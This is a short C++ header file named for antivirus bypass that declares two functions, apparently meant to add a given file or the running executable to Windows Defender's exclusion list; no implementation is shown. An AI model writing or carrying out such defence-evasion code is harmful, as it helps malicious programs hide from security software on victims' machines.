//
// Created by MateuszAndruszkiewic on 17.12.2024.
//

#ifndef AV_BYPASS_H
#define AV_BYPASS_H
#include <string>

bool AddToDefenderExclusions(const std::wstring& filePath);
bool AddCurrentExecutableToDefenderExclusions();

#endif //AV_BYPASS_H
